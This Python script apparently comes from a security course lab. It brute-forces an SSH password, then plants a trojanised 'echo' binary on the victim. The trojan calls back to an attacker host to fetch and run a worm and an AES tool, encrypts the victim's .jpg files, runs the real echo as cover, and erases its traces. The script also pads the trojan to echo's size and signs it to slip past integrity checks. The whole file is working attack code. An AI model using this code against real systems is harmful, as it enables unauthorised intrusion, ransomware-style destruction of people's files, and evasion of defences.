#!/usr/bin/env python3

import os
import sys
import time
import base64
import subprocess
import itertools
import paramiko


username = "csc2025"  
victim_port = 22

# hardcore the info tmp 
# victim_ip = "172.18.0.3"
# attacker_ip = "172.18.0.2"
# attacker_port = 29

victim_ip = sys.argv[1] 
attacker_ip = sys.argv[2]
attacker_port = sys.argv[3]


def try_ssh_login(password, retries=5, delay=3):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for attempt in range(1, retries + 1):
        try:
            ssh.connect(victim_ip, port=victim_port, username=username, password=password)
            print(f"[+] Success! Password found: {password}")   
            ssh.close()
            return True
        
        except paramiko.AuthenticationException:
            print(f"[-] Failed: {password}")
            return False  # Don't retry for wrong passwords
        
        except Exception as e:
            print(f"[!] {attempt}: {e}")
        
        if attempt < retries:
            time.sleep(delay)
            print("[*] Retrying...")
        else:
            print("[x] Max retries reached. Skipping password.")

    return False



def brute_force_ssh(): 
    with open("victim.dat", "r") as f:
        data = f.read().split('\n') 

    max_length = len(data)

    for length in range(1, max_length + 1):
        for combo in itertools.product(data, repeat=length):
            password = ''.join(combo)
            if try_ssh_login(password):
                return password


def zip_echo():
    os.system("zip -j /app/echo.zip /usr/bin/echo > /dev/null")
    if os.path.exists("/app/echo.zip"):
        with open("/app/echo.zip", "rb") as file:
            return file.read()
    else:
        print(f'Error: echo.zip not created')



def create_echo_virus(echo_bytes: bytes):
    encoded = base64.b64encode(echo_bytes).decode()

    code = f"""#!/usr/bin/python3
import sys, os, socket, base64, subprocess
from zipfile import ZipFile

def receive_files():
    sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sockfd.connect(("{attacker_ip}", {attacker_port}))

    buffer = b""
    filenames = ["worm.py", "aes-tool.c"]
    file_index = 0

    delimiter = b"########END_OF_FILE########"

    while file_index < len(filenames):
        data = sockfd.recv(1024)
        if not data:
            break
        buffer += data

        while delimiter in buffer:
            file_data, buffer = buffer.split(delimiter, 1)
            with open(filenames[file_index], "wb") as f:
                f.write(file_data)
            file_index += 1

    sockfd.close()

if __name__ == "__main__":
    receive_files()

    subprocess.run(["python3", "worm.py"])
    subprocess.run(["rm", "worm.py"])
    
    echo_64 = base64.b64decode("{encoded}")
    with open("/app/echo.zip", "wb") as f:
        f.write(echo_64)

    subprocess.run(["unzip", "-o", "/app/echo.zip", "-d", "/tmp"], stdout=subprocess.DEVNULL)
    subprocess.run(["chmod", "+x", "/tmp/echo"])
    subprocess.run(["/tmp/echo"] + sys.argv[1:])
    subprocess.run(["rm", "echo.zip"])
    subprocess.run(["rm", "/tmp/echo"])

    subprocess.run(["gcc", "-o", "aes-tool", "aes-tool.c", "-lssl", "-lcrypto"])

    for item in os.listdir("/app/Pictures/"):
        if item.endswith(".jpg"):
            input_path = os.path.join("/app/Pictures", item)
            temp_path = "/app/Pictures/temp.jpg"

            subprocess.run(["./aes-tool", "enc", input_path, temp_path])
            os.rename(temp_path, input_path)

    subprocess.run(["rm", "aes-tool.c"])
    subprocess.run(["rm", "aes-tool"])
    exit(0)
"""

    output_path = "malicious_echo"
    with open(output_path, 'wb') as f1:
        f1.write(code.encode())


    normal_echo_size = os.path.getsize("/usr/bin/echo")
    size_after_write = os.path.getsize(output_path)

    difference = normal_echo_size - size_after_write 


    subprocess.run([
        "openssl", "dgst", "-sha256",
        "-binary",                         
        "-out", "/tmp/echo.hash",
        output_path
    ], check=True)

    subprocess.run([
        "openssl", "pkeyutl",
        "-provider", "oqsprovider",
        "-sign",
        "-inkey", "/app/certs/host.key",
        "-in", "/tmp/echo.hash",
        "-out", "/app/certs/cert.sig"
    ], check=True)


    with open("/app/certs/cert.sig", "rb") as sig_file:
        signature = sig_file.read()

    signature_b64 = base64.b64encode(signature[:512]).decode("ascii")

    with open(output_path, 'a') as f2: 
        f2.write(' ' * (difference - len(signature_b64) - 8)) 
        f2.write('\n"""')                 
        f2.write(signature_b64)         
        f2.write('"""\n')    

    return output_path 



if __name__ == "__main__":
    password = brute_force_ssh()
    # password = 'csc2025'
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(victim_ip, port=victim_port, username=username, password=password)

    sftp = ssh.open_sftp()

    output_path = create_echo_virus(zip_echo())

    sftp.put(output_path , '/app/echo')
    ssh.exec_command('chmod +x /app/echo')

    ssh.close()




